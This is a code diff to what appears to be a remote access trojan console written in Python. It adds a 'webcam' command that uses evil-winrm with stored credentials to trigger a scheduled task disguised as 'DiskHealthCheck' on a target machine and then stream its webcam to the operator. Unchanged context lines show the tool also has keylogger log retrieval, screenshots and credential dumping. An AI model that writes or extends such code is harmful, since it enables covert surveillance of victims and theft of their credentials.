@@ -211,6 +211,36 @@ def keylogger(target_ip):
     except Exception as e:
         print(f"[-] Failed to download keylogger logs: {e}")
 
+def webcam(target_ip):
+    print(f"[*] Triggering webcam stream task on {target_ip} ...")
+    payload = f'Start-ScheduledTask -TaskName "DiskHealthCheck"'
+    try:
+        result = subprocess.run(
+            ["evil-winrm", "-i", target_ip, "-u", USERNAME, "-p", PASSWORD],
+            input=payload + "\nexit\n",
+            text=True,
+            capture_output=True,
+            timeout=15
+        )
+        if result.returncode == 0:
+            print("[+] Task trigger command sent successfully")
+            stream_url = f"http://{target_ip}:8080/"
+            print("\n" + "═" * 60)
+            print(f"   Stream should now be available at:")
+            print(f"   {stream_url}")
+            print("═" * 60)
+            print()
+            print(" In another terminal run one of these commands:")
+            print()
+            print(f"   cvlc {stream_url}")
+            
+        else:
+            print(f"[-] evil-winrm error:\n{result.stderr}")
+            
+    except Exception as e:
+        print(f"[-] Failed to trigger task: {e}")
+        
+
 def cli():
     username = getpass.getuser()
     current_target = None
@@ -225,6 +255,7 @@ def cli():
         key-logger     To be determined
         screen-shot    Take screenshot
         dump           Credentials dump
+        webcam         Monitor the webcam on target 
         exit, q        Exit the console
     """
     print("[*] Type help or h to see all commands...\n")
@@ -280,6 +311,12 @@ def cli():
                 print("[-] No target connected. Use 'listen' first.")
             else:
                 credential_dump(current_target)
+        
+        elif cmd == "webcam":
+            if not current_target:
+                print("[-] No target connected. Use 'listen' first.")
+            else:
+                webcam(current_target)
 
         elif cmd == "":
             continue
